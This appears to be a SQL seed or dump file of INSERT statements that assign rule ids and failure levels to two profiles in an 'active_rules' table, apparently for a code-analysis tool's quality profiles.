INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (60, 1, 320, 2, NULL, 1510817822249, 1510817822249);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (61, 1, 426, 2, NULL, 1510817822258, 1510817822258);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (62, 1, 424, 3, NULL, 1510817822268, 1510817822268);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (63, 1, 316, 3, NULL, 1510817822272, 1510817822272);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (64, 1, 425, 4, NULL, 1510817822277, 1510817822277);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (65, 1, 391, 1, NULL, 1510817822291, 1510817822291);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (66, 1, 298, 2, NULL, 1510817822296, 1510817822296);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (67, 1, 369, 1, NULL, 1510817822299, 1510817822299);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (68, 1, 306, 2, NULL, 1510817822304, 1510817822304);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (69, 1, 331, 2, NULL, 1510817822310, 1510817822310);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (70, 1, 392, 1, NULL, 1510817822318, 1510817822318);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (71, 1, 408, 1, NULL, 1510817822322, 1510817822322);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (72, 1, 327, 2, NULL, 1510817822326, 1510817822326);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (73, 1, 365, 2, NULL, 1510817822331, 1510817822331);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (74, 1, 431, 3, NULL, 1510817822335, 1510817822335);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (75, 1, 413, 3, NULL, 1510817822339, 1510817822339);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (76, 1, 440, 3, NULL, 1510817822343, 1510817822343);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (77, 1, 409, 4, NULL, 1510817822354, 1510817822354);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (78, 1, 364, 4, NULL, 1510817822358, 1510817822358);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (79, 1, 335, 2, NULL, 1510817822362, 1510817822362);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (80, 1, 448, 3, NULL, 1510817822366, 1510817822366);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (81, 1, 370, 4, NULL, 1510817822370, 1510817822370);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (82, 1, 447, 2, NULL, 1510817822374, 1510817822374);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (83, 1, 387, 3, NULL, 1510817822382, 1510817822382);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (84, 1, 390, 2, NULL, 1510817822386, 1510817822386);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (85, 1, 341, 3, NULL, 1510817822391, 1510817822391);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (86, 1, 332, 1, NULL, 1510817822396, 1510817822396);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (87, 1, 303, 2, NULL, 1510817822402, 1510817822402);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (88, 1, 360, 1, NULL, 1510817822405, 1510817822405);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (89, 1, 328, 2, NULL, 1510817822411, 1510817822411);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (90, 1, 411, 3, NULL, 1510817822416, 1510817822416);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (91, 1, 347, 3, NULL, 1510817822422, 1510817822422);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (92, 1, 428, 3, NULL, 1510817822426, 1510817822426);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (93, 1, 450, 3, NULL, 1510817822434, 1510817822434);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (94, 1, 418, 2, NULL, 1510817822438, 1510817822438);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (95, 1, 323, 3, NULL, 1510817822442, 1510817822442);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (96, 1, 419, 2, NULL, 1510817822446, 1510817822446);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (97, 1, 366, 3, NULL, 1510817822450, 1510817822450);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (98, 1, 324, 3, NULL, 1510817822454, 1510817822454);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (99, 1, 396, 2, NULL, 1510817822458, 1510817822458);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (100, 1, 372, 2, NULL, 1510817822466, 1510817822466);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (101, 1, 368, 3, NULL, 1510817822470, 1510817822470);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (102, 2, 27, 2, NULL, 1510817822490, 1510817822490);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (103, 2, 950, 1, NULL, 1510817822499, 1510817822499);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (104, 2, 949, 1, NULL, 1510817822511, 1510817822511);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (105, 2, 755, 2, NULL, 1510817822517, 1510817822517);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (106, 2, 1067, 2, NULL, 1510817822523, 1510817822523);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (107, 2, 1076, 2, NULL, 1510817822529, 1510817822529);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (108, 2, 837, 2, NULL, 1510817822534, 1510817822534);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (109, 2, 1064, 2, NULL, 1510817822540, 1510817822540);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (110, 2, 1107, 1, NULL, 1510817822545, 1510817822545);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (111, 2, 1115, 3, NULL, 1510817822551, 1510817822551);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (112, 2, 1111, 1, NULL, 1510817822556, 1510817822556);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (113, 2, 1100, 1, NULL, 1510817822564, 1510817822564);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (114, 2, 1104, 1, NULL, 1510817822571, 1510817822571);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (115, 2, 1091, 1, NULL, 1510817822576, 1510817822576);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (116, 2, 901, 2, NULL, 1510817822587, 1510817822587);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (117, 2, 850, 2, NULL, 1510817822591, 1510817822591);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (118, 2, 783, 4, NULL, 1510817822595, 1510817822595);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (119, 2, 806, 3, NULL, 1510817822599, 1510817822599);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (120, 2, 775, 1, NULL, 1510817822603, 1510817822603);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (121, 2, 686, 1, NULL, 1510817822608, 1510817822608);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (122, 2, 979, 2, NULL, 1510817822611, 1510817822611);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (123, 2, 983, 2, NULL, 1510817822618, 1510817822618);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (124, 2, 989, 2, NULL, 1510817822627, 1510817822627);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (125, 2, 730, 1, NULL, 1510817822633, 1510817822633);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (126, 2, 710, 1, NULL, 1510817822642, 1510817822642);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (127, 2, 1034, 2, NULL, 1510817822646, 1510817822646);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (128, 2, 919, 2, NULL, 1510817822653, 1510817822653);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (129, 2, 849, 3, NULL, 1510817822663, 1510817822663);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (130, 2, 888, 3, NULL, 1510817822667, 1510817822667);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (131, 2, 747, 1, NULL, 1510817822670, 1510817822670);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (132, 2, 791, 2, NULL, 1510817822674, 1510817822674);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (133, 2, 1042, 2, NULL, 1510817822678, 1510817822678);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (134, 2, 956, 2, NULL, 1510817822687, 1510817822687);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (135, 2, 922, 2, NULL, 1510817822692, 1510817822692);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (136, 2, 776, 2, NULL, 1510817822697, 1510817822697);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (137, 2, 695, 1, NULL, 1510817822701, 1510817822701);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (138, 2, 1028, 1, NULL, 1510817822705, 1510817822705);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (139, 2, 1032, 1, NULL, 1510817822709, 1510817822709);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (140, 2, 1036, 1, NULL, 1510817822714, 1510817822714);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (141, 2, 706, 1, NULL, 1510817822717, 1510817822717);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (142, 2, 1105, 0, NULL, 1510817822727, 1510817822726);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (143, 2, 1108, 2, NULL, 1510817822731, 1510817822731);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (144, 2, 1110, 0, NULL, 1510817822735, 1510817822735);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (145, 2, 1068, 2, NULL, 1510817822739, 1510817822739);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (146, 2, 1073, 2, NULL, 1510817822743, 1510817822743);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (147, 2, 1035, 2, NULL, 1510817822746, 1510817822746);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (148, 2, 1087, 1, NULL, 1510817822751, 1510817822751);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (149, 2, 1065, 2, NULL, 1510817822756, 1510817822756);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (150, 2, 951, 2, NULL, 1510817822760, 1510817822760);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (151, 2, 954, 1, NULL, 1510817822764, 1510817822764);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (152, 2, 957, 1, NULL, 1510817822774, 1510817822774);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (153, 2, 960, 1, NULL, 1510817822778, 1510817822778);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (154, 2, 962, 1, NULL, 1510817822782, 1510817822782);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (155, 2, 926, 2, NULL, 1510817822785, 1510817822785);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (156, 2, 934, 3, NULL, 1510817822789, 1510817822789);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (157, 2, 938, 1, NULL, 1510817822793, 1510817822793);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (158, 2, 945, 2, NULL, 1510817822802, 1510817822802);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (159, 2, 995, 1, NULL, 1510817822805, 1510817822805);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (160, 2, 996, 2, NULL, 1510817822809, 1510817822809);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (161, 2, 997, 2, NULL, 1510817822813, 1510817822813);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (162, 2, 1001, 3, NULL, 1510817822817, 1510817822817);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (163, 2, 1003, 3, NULL, 1510817822821, 1510817822821);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (164, 2, 967, 2, NULL, 1510817822826, 1510817822826);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (165, 2, 968, 1, NULL, 1510817822830, 1510817822830);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (166, 2, 975, 1, NULL, 1510817822834, 1510817822834);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (167, 2, 978, 3, NULL, 1510817822842, 1510817822842);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (168, 2, 720, 4, NULL, 1510817822846, 1510817822846);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (169, 2, 721, 2, NULL, 1510817822850, 1510817822850);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (170, 2, 722, 3, NULL, 1510817822854, 1510817822854);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (171, 2, 723, 2, NULL, 1510817822864, 1510817822864);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (172, 2, 728, 1, NULL, 1510817822868, 1510817822868);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (173, 2, 733, 1, NULL, 1510817822872, 1510817822872);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (174, 2, 737, 1, NULL, 1510817822876, 1510817822876);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (175, 2, 833, 2, NULL, 1510817822880, 1510817822880);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (176, 2, 823, 1, NULL, 1510817822883, 1510817822883);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (177, 2, 874, 1, NULL, 1510817822887, 1510817822887);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (178, 2, 884, 3, NULL, 1510817822893, 1510817822893);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (179, 2, 863, 3, NULL, 1510817822897, 1510817822897);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (180, 2, 867, 2, NULL, 1510817822906, 1510817822906);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (181, 2, 869, 4, NULL, 1510817822910, 1510817822910);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (182, 2, 855, 1, NULL, 1510817822914, 1510817822914);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (183, 2, 856, 2, NULL, 1510817822922, 1510817822922);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (184, 2, 858, 2, NULL, 1510817822926, 1510817822926);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (185, 2, 851, 1, NULL, 1510817822930, 1510817822930);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (186, 2, 1075, 1, NULL, 1510817822934, 1510817822934);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (187, 2, 914, 1, NULL, 1510817822937, 1510817822937);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (188, 2, 846, 1, NULL, 1510817822953, 1510817822953);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (189, 2, 840, 2, NULL, 1510817822957, 1510817822957);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (190, 2, 841, 1, NULL, 1510817822961, 1510817822961);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (191, 2, 834, 1, NULL, 1510817822966, 1510817822966);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (192, 2, 871, 1, NULL, 1510817822970, 1510817822970);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (193, 2, 875, 3, NULL, 1510817822982, 1510817822982);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (194, 2, 1037, 2, NULL, 1510817822986, 1510817822986);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (195, 2, 1014, 1, NULL, 1510817822990, 1510817822990);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (196, 2, 1029, 1, NULL, 1510817822993, 1510817822993);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (197, 2, 1053, 1, NULL, 1510817822998, 1510817822998);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (198, 2, 1056, 3, NULL, 1510817823001, 1510817823001);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (199, 2, 777, 1, NULL, 1510817823005, 1510817823005);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (200, 2, 780, 2, NULL, 1510817823009, 1510817823009);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (201, 2, 782, 2, NULL, 1510817823018, 1510817823018);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (202, 2, 805, 1, NULL, 1510817823026, 1510817823026);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (203, 2, 799, 1, NULL, 1510817823030, 1510817823030);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (204, 2, 801, 1, NULL, 1510817823034, 1510817823034);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (205, 2, 894, 1, NULL, 1510817823038, 1510817823038);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (206, 2, 898, 1, NULL, 1510817823042, 1510817823042);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (207, 2, 915, 2, NULL, 1510817823046, 1510817823046);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (208, 2, 917, 1, NULL, 1510817823050, 1510817823050);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (209, 2, 815, 2, NULL, 1510817823053, 1510817823053);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (210, 2, 786, 1, NULL, 1510817823057, 1510817823057);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (211, 2, 906, 2, NULL, 1510817823062, 1510817823062);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (212, 2, 899, 2, NULL, 1510817823066, 1510817823066);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (213, 2, 778, 2, NULL, 1510817823078, 1510817823078);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (214, 2, 779, 4, NULL, 1510817823082, 1510817823082);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (215, 2, 781, 2, NULL, 1510817823085, 1510817823085);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (216, 2, 802, 2, NULL, 1510817823089, 1510817823089);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (217, 2, 803, 1, NULL, 1510817823097, 1510817823097);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (218, 2, 796, 2, NULL, 1510817823102, 1510817823102);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (219, 2, 797, 2, NULL, 1510817823105, 1510817823105);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (220, 2, 904, 2, NULL, 1510817823110, 1510817823110);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (221, 2, 905, 2, NULL, 1510817823113, 1510817823113);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (222, 2, 807, 1, NULL, 1510817823117, 1510817823117);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (223, 2, 811, 1, NULL, 1510817823120, 1510817823120);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (224, 2, 821, 1, NULL, 1510817823124, 1510817823124);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (225, 2, 819, 3, NULL, 1510817823128, 1510817823128);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (226, 2, 793, 1, NULL, 1510817823132, 1510817823132);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (227, 2, 907, 3, NULL, 1510817823136, 1510817823136);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (228, 2, 712, 1, NULL, 1510817823142, 1510817823142);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (229, 2, 756, 2, NULL, 1510817823145, 1510817823145);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (230, 2, 760, 2, NULL, 1510817823149, 1510817823149);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (231, 2, 758, 3, NULL, 1510817823156, 1510817823156);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (232, 2, 767, 1, NULL, 1510817823161, 1510817823161);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (233, 2, 764, 1, NULL, 1510817823165, 1510817823165);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (234, 2, 769, 4, NULL, 1510817823170, 1510817823170);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (235, 2, 748, 4, NULL, 1510817823174, 1510817823174);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (236, 2, 685, 1, NULL, 1510817823179, 1510817823179);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (237, 2, 684, 3, NULL, 1510817823186, 1510817823186);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (238, 2, 688, 1, NULL, 1510817823189, 1510817823189);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (239, 2, 687, 4, NULL, 1510817823194, 1510817823194);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (240, 2, 689, 1, NULL, 1510817823198, 1510817823198);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (241, 2, 1096, 2, NULL, 1510817823203, 1510817823203);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (242, 2, 1070, 2, NULL, 1510817823207, 1510817823207);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (243, 2, 1078, 2, NULL, 1510817823211, 1510817823211);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (244, 2, 1074, 2, NULL, 1510817823214, 1510817823214);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (245, 2, 1081, 2, NULL, 1510817823218, 1510817823218);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (246, 2, 1085, 2, NULL, 1510817823231, 1510817823231);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (247, 2, 1066, 2, NULL, 1510817823235, 1510817823235);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (248, 2, 958, 3, NULL, 1510817823239, 1510817823239);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (249, 2, 955, 2, NULL, 1510817823243, 1510817823243);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (250, 2, 963, 2, NULL, 1510817823246, 1510817823246);
